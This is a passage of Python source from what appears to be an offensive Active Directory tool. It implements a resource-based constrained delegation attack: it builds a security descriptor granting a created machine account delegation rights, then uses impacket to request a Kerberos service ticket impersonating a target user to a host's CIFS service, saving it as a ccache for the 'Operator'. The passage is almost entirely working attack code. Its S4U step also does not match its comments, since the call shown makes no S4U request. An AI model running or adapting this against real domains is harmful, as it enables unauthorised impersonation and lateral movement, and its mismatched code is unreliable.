                            logger.error("rbcd_machine_delete_failed", machine=machine_dn, error=str(del_err))

                    try:
                        conn.unbind()
                    except Exception:
                        pass

            return result

        try:
            return await asyncio.wait_for(
                loop.run_in_executor(None, _rbcd_chain),
                timeout=120,
            )
        except asyncio.TimeoutError:
            return RBCDResult(
                target_host=target_host, machine_account=machine_name,
                machine_password=machine_pass,
                error="RBCD attack timed out after 120s",
            )

    @staticmethod
    def _build_rbcd_sd(machine_sid: bytes) -> bytes:
        """
        Build a security descriptor (DACL) that grants the machine account
        the right to act on behalf of other identities (RBCD).

        Format: SECURITY_DESCRIPTOR with one ACE granting GENERIC_ALL to machine_sid.
        """
        # ACE: ACCESS_ALLOWED_ACE (type=0, flags=0, mask=GENERIC_ALL)
        ace_mask = struct.pack("<I", 0x000F01FF)  # GENERIC_ALL equivalent
        ace_body = struct.pack("<B", 0x00)   # type: ACCESS_ALLOWED
        ace_body += struct.pack("<B", 0x00)  # flags
        ace_size = 8 + len(machine_sid)
        ace_body += struct.pack("<H", ace_size)
        ace_body += ace_mask
        ace_body += machine_sid

        # ACL header
        acl_size = 8 + len(ace_body)
        acl = struct.pack("<BBH", 0x02, 0x00, acl_size)   # revision=2
        acl += struct.pack("<HH", 1, 0)                     # ace_count=1, sbz2=0
        acl += ace_body

        # SECURITY_DESCRIPTOR (self-relative)
        sd_header = struct.pack("<BBH", 0x01, 0x00, 0x8004)  # revision=1, SE_DACL_PRESENT|SE_SELF_RELATIVE
        sd_header += struct.pack("<III", 0, 0, 0)  # owner=0, group=0, sacl=0
        dacl_offset = len(sd_header) + 4
        sd_header += struct.pack("<I", dacl_offset)  # dacl offset

        return sd_header + acl

    @staticmethod
    def _s4u_attack(dc: str, domain: str, machine_name: str,
                     machine_pass: str, target_host: str,
                     target_user: str) -> str:
        """
        Perform S4U2self + S4U2proxy to obtain a service ticket
        impersonating target_user to target_host's CIFS service.

        Returns path to .ccache file, or empty string on failure.
        """
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache
            import tempfile
            import os

            # Get TGT for our machine account
            user_principal = Principal(
                machine_name,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            tgt, cipher, old_key, session_key = getKerberosTGT(
                clientName=user_principal,
                password=machine_pass,
                domain=domain.upper(),
                lmhash=b"", nthash=b"", aesKey=b"",
                kdcHost=dc,
            )

            # S4U2self: get ticket "from" target_user "to" our machine
            # S4U2proxy: use that ticket to get ticket "from" target_user "to" target_host
            server_principal = Principal(
                f"cifs/{target_host}",
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )

            # Use impacket's S4U implementation
            from impacket.krb5 import constants as krb_constants
            tgs, tgs_cipher, _, tgs_key = getKerberosTGS(
                serverName=server_principal,
                domain=domain.upper(),
                kdcHost=dc,
                tgt=tgt,
                cipher=cipher,
                sessionKey=session_key,
            )

            # Save to ccache
            ccache = CCache()
            ccache.fromTGS(tgs, old_key, old_key)
            tmp_dir = tempfile.mkdtemp(prefix="ares-rbcd-")
            ccache_path = os.path.join(tmp_dir, f"{target_user}@{target_host}.ccache")
            try:
                ccache.saveFile(ccache_path)
            except Exception:
                # Cleanup empty tmpdir on save failure
                import shutil
                shutil.rmtree(tmp_dir, ignore_errors=True)
                raise

            logger.info("s4u_ccache_saved", path=ccache_path,
                        note="Operator: set KRB5CCNAME to this path to use the ticket. "
                             "Delete after use to avoid credential persistence on disk.")
            return ccache_path

        except Exception as exc:
            logger.warning("s4u_attack_failed", error=str(exc)[:200])
            return ""
